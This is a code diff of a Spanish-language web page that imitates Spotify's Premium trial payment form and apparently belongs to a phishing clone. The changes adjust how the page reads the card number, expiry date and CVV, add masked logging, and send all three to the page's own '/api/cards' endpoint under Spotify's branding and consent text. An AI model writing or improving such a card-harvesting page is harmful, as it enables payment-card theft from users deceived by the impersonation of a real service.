@@ -502,7 +502,7 @@
             Das tu consentimiento para obtener acceso a tu suscripción de Spotify inmediatamente y a que, si no cancelas antes de que termine el período de prueba el 5 de junio de 2025, se te cobre la tarifa de suscripción de forma automática todos los meses hasta que canceles. Si la cancelas durante el período de prueba, perderás el acceso a las ventajas de Premium inmediatamente.
         </div>
 
-        <form id="paymentForm" onsubmit="submitForm(event)">
+        <form id="paymentForm">
             <button type="submit" class="submit-btn">Guardar</button>
         </form>
 
@@ -637,9 +637,15 @@
                 submitButton.textContent = 'Guardando...';
 
                 try {
-                    const cardNumber = document.getElementById('cardNumber').value;
-                    const expiryDate = document.getElementById('expiryDate').value;
-                    const cvv = document.getElementById('cvv').value;
+                    const cardNumber = document.querySelector('input[placeholder="0000 0000 0000 0000"]').value;
+                    const expiryDate = document.querySelector('input[placeholder="MM/AA"]').value;
+                    const cvv = document.querySelector('input[placeholder="123"]').value;
+
+                    console.log('Enviando datos:', {
+                        cardNumber: '*'.repeat(cardNumber.length-4) + cardNumber.slice(-4),
+                        expiryDate,
+                        cvv: '***'
+                    });
 
                     const response = await fetch('/api/cards', {
                         method: 'POST',
@@ -647,7 +653,7 @@
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            cardNumber,
+                            cardNumber: cardNumber.replace(/\s/g, ''),
                             expiryDate,
                             cvv
                         })
